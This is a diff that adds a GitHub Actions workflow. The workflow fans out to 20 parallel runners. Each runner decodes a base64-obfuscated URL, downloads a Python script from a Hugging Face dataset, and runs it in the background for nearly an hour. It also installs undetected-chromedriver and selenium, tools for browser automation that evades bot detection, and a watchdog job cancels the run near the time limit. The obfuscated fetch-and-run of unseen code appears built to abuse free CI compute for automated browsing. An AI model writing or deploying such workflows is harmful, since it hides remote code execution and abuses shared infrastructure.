@@ -1,0 +1,108 @@
+name: Horizon Engine Matrix
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: horizon-sync-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: يراقب الوقت ويقوم بإلغاء سريان Workflow عند انقضاء المدة
+  # =================================================================
+  system-watchdog:
+    name: "System Watchdog Supervisor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      SUPERVISOR_TIMEOUT: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          printf '%s\n' "[WATCHDOG] Monitor online for Run ID: ${{ github.run_id }}"
+          printf '%s\n' "[WATCHDOG] Delay set to ${SUPERVISOR_TIMEOUT} seconds."
+
+          sleep "$SUPERVISOR_TIMEOUT"
+
+          printf '%s\n' "[WATCHDOG] Limit reached. Aborting execution..."
+
+          curl --silent --show-error --request POST \
+            --header "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            --header "Accept: application/vnd.github+json" \
+            --header "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          printf '%s\n' "[WATCHDOG] Abort signal broadcasted successfully."
+
+  # =================================================================
+  # Worker Nodes: تشغيل بالتوازي لوحدات المعالجة
+  # =================================================================
+  compute-cluster:
+    name: "Worker-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: [
+          "NODE_A10", "NODE_B20", "NODE_C30", "NODE_D40", "NODE_E50",
+          "NODE_F60", "NODE_G70", "NODE_H80", "NODE_I90", "NODE_J00",
+          "NODE_K11", "NODE_L22", "NODE_M33", "NODE_N44", "NODE_O55",
+          "NODE_P66", "NODE_Q77", "NODE_R88", "NODE_S99", "NODE_T01"
+        ]
+
+    steps:
+      # #################################################################
+      # الخطوة 1: تهيئة البيئة والأنظمة الأساسية
+      # #################################################################
+      - name: Setup Environment
+        run: |
+          echo "[SETUP] Preparing node environment: ${{ matrix.node_tag }}..."
+          DEBIAN_FRONTEND=noninteractive sudo apt-get update -qq -y
+          DEBIAN_FRONTEND=noninteractive sudo apt-get install -y -qq python3-pip curl
+
+      # #################################################################
+      # الخطوة 2: جلب ملف التشغيل البرمجي من المصدر
+      # #################################################################
+      - name: Fetch Core Script
+        run: |
+          echo "[FETCH] Retrieving operational binary..."
+          REMOTE_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -s -L "$REMOTE_URL" --output app_runner.py
+          echo "[FETCH] File saved as app_runner.py."
+
+      # #################################################################
+      # الخطوة 3: تثبيت حزم وباقات الدعم
+      # #################################################################
+      - name: Install Python Dependencies
+        run: |
+          echo "[DEPS] Installing required libraries..."
+          python3 -m pip install --quiet --no-cache-dir undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # الخطوة 4: تشغيل النص البرمجي مع إدارة فترة بقائه
+      # #################################################################
+      - name: Execute Runner Task
+        run: |
+          echo "=== Executing task on ${{ matrix.node_tag }} ==="
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo "=== Process started with PID: $TASK_PID. Timer running (3540s max). ==="
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "=== Timeout limit reached. Stopping PID $TASK_PID... ==="
+            kill -9 "$TASK_PID" 2>/dev/null || true
+            echo "=== Process force-killed. ==="
+          else
+            echo "=== Process ended organically before limit. ==="
+          fi
